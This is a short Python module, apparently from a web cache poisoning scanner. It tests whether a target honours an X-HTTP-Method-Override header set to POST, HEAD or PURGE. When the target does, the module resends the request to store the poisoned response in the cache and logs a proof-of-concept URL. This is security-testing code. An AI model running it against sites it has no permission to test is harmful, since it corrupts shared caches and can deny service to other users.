from core.cache import extract_cache_headers
import core.config

class MethodOverrideAttack:
    name = "HTTP Method Override"

    METHODS = ["POST", "HEAD", "PURGE"]

    def run(self, ctx):
        ctx.log.debug("HTTP Method Override")

        for m in self.METHODS:
            headers = ctx.headers.copy()
            headers["X-HTTP-Method-Override"] = m

            resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

            if resp and ctx.is_different(resp):
                if extract_cache_headers(resp):
                    # Send the same request one more time to save the cache
                    _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)
                    ctx.log.vuln(f"Method override → {m} | Exploit PoC: {ctx.url}?{cb}")

                    if core.config.open_browser:
                        import webbrowser
                        webbrowser.open_new_tab(f"{ctx.url}?{cb}")
                    return

        ctx.log.error("Not vulnerable")